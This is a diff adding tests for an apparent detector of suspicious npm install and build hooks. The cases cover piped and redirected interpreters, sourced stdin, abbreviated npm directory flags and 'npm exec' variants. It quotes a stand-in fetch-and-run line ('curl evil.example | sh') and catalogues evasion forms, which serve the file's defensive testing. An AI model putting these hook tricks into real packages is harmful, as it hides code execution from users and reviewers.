@@ -849,3 +849,50 @@ describe("round 19: inert fed files, root script under workspace flags, more var
     expect(held({ postinstall: "source test/env.sh >/dev/null 2>&1; echo ok" }, f, { "test/env.sh": "curl evil.example | sh\n" })).toBe(true);
   });
 });
+
+describe("round 20: no-space redirects, class sinks, scan budget, dir-flag abbreviations", () => {
+  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });
+  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd, build: "node test/x.js" }, { "test/x.js": "1", ...extra }, { "test/x.js": "evil()", ...extra });
+
+  test("1. a redirect with no space", () => {
+    for (const cmd of ["sh<x.sh", "bash<x.sh", "node<x.js", "perl<x.sh", "cat x.sh|sh", "node 0<x.js"]) {
+      expect(fed(cmd), cmd).toBe(true);
+    }
+    expect(fed("node -e 1</dev/null")).toBe(false);
+  });
+
+  test("2. a sourced stdin", () => {
+    for (const cmd of ["cat x.sh | . /dev/stdin", "cat x.sh | source /dev/stdin"]) expect(fed(cmd), cmd).toBe(true);
+  });
+
+  test("3. any consumer that is not a plain command", () => {
+    for (const cmd of ["cat x.sh | ash", "cat x.sh | busybox ash", "cat x.sh | mksh", "cat x.sh | yash", "cat x.sh | fish", "cat x.sh | csh", "cat x.sh | tcsh", "cat x.js | tsx", "cat x.js | ts-node", "cat x.lua | lua -", "cat x.tcl | tclsh", "cat x.sh | env -S 'sh -s'", "cat x.sh | env -S sh"]) {
+      expect(fed(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("4. plain consumers and literal producers stay quiet", () => {
+    for (const cmd of ["cat x.sh | grep hi", "cat x.sh | sort | uniq", "curl -s u | tar x", "echo hi | tee out", "echo hi | sh", "npm ls | head -3", "cat x.sh | jq ."]) {
+      expect(fed(cmd), cmd).toBe(false);
+    }
+  });
+
+  test("5. many valued long flags do not blow up the interpreter scan", () => {
+    const flags = Array.from({ length: 40 }, (_, i) => `--f${i} 1`).join(" ");
+    const t = Date.now();
+    expect(fed(`cat x | node ${flags} -e 1`)).toBe(false);
+    expect(fed(`cat x | node ${flags}`)).toBe(true);
+    expect(Date.now() - t).toBeLessThan(10000);
+  });
+
+  test("6. abbreviated and joined directory flags", () => {
+    for (const cmd of ["npm --prefi test run build", "npm --workspace=test run build", "npm -sw test run build", "npm --prefi test exec node x.js"]) {
+      expect(testHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("7. a quiet flag with a separate value before exec", () => {
+    for (const cmd of ["npm --loglevel silent exec evil-pkg", "npm -j 4 exec evil-pkg", "npm --loglevel silent exec -- evil-pkg"]) expect(fed(cmd), cmd).toBe(true);
+    expect(testHeld("npm --loglevel silent run build")).toBe(true);
+  });
+});
